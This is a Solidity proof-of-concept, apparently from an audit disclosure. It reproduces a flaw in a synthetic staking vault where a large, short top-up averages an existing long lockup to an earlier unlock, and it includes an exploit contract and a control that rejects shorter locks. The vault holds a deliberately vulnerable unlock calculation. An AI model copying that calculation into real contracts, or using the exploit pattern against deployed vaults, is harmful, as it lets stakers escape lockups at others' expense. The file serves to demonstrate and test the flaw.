// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    SapienVault — a shorter top-up pulls the whole lock forward (#62026)

    SYNTHETIC, cheatcode-free. stake() replaces the stored unlock with the
    weighted average of the old unlock and the new one:

        unlock = (oldAmount * oldUnlock + newAmount * newUnlock) / total

    1000 tokens locked 365 days, then 10000 tokens locked 30 days, moves
    the unlock earlier by 26312728 seconds. All 11000 tokens are bound by
    the new time. The control rejects a shorter lockup and the original
    unlock stays. One transaction. No warp inside run().
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract SapienVault {
    struct Pos {
        uint256 amount;
        uint256 unlock;
    }

    Token public immutable token;
    bool public immutable rejectShorter;
    mapping(address => Pos) public positions;

    constructor(Token t, bool rejectShorter_) {
        token = t;
        rejectShorter = rejectShorter_;
    }

    function stake(uint256 amount, uint256 lockup) external {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        Pos storage p = positions[msg.sender];
        uint256 newUnlock = block.timestamp + lockup;
        if (p.amount == 0) {
            p.amount = amount;
            p.unlock = newUnlock;
        } else {
            if (rejectShorter) {
                require(newUnlock >= p.unlock, "shorter lock");
            }
            // @> VULN: weighted average can move an existing unlock earlier
            p.unlock = (p.amount * p.unlock + amount * newUnlock) / (p.amount + amount);
            p.amount += amount;
        }
    }
}

contract Exploit {
    Token public token; // CREATE 1
    SapienVault public vault; // CREATE 2

    uint256 public unlockBefore;
    uint256 public unlockAfter;
    uint256 public earlyBy;
    uint256 public locked;

    constructor() {
        token = new Token();
        vault = new SapienVault(token, false);
    }

    function run() external {
        token.mint(address(this), 11_000 ether);
        token.approve(address(vault), 11_000 ether);
        vault.stake(1000 ether, 365 days);
        (uint256 amountBefore, uint256 unlock1) = vault.positions(address(this));
        unlockBefore = unlock1;
        require(amountBefore == 1000 ether, "first stake");
        vault.stake(10_000 ether, 30 days);
        (uint256 amountAfter, uint256 unlock2) = vault.positions(address(this));
        unlockAfter = unlock2;
        locked = amountAfter;
        earlyBy = unlockBefore - unlockAfter;
        require(unlockAfter < unlockBefore, "unlock moved earlier");
        require(earlyBy == 26_312_728, "shortened by 26312728 seconds");
        require(locked == 11_000 ether, "all 11000 tokens use the new unlock");
    }
}

contract ControlExploit {
    Token public token;
    SapienVault public vault;

    bool public shorterReverted;
    uint256 public unlockBefore;
    uint256 public unlockAfter;
    uint256 public locked;

    constructor() {
        token = new Token();
        vault = new SapienVault(token, true);
    }

    function run() external {
        token.mint(address(this), 11_000 ether);
        token.approve(address(vault), 11_000 ether);
        vault.stake(1000 ether, 365 days);
        (, uint256 unlock1) = vault.positions(address(this));
        unlockBefore = unlock1;
        (bool ok,) = address(vault).call(
            abi.encodeWithSelector(vault.stake.selector, uint256(10_000 ether), uint256(30 days))
        );
        shorterReverted = !ok;
        (uint256 amountAfter, uint256 unlock2) = vault.positions(address(this));
        unlockAfter = unlock2;
        locked = amountAfter;
        require(shorterReverted, "shorter stake reverted");
        require(unlockAfter == unlockBefore, "365-day unlock kept");
        require(locked == 1000 ether, "only the original stake");
    }
}
